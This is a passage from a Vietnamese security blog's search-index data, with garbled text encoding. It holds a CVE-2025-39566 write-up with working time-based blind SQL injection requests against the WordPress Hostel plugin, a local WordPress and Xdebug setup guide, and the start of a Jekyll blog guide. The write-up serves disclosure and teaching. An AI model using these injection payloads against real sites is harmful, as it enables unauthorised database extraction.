b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, 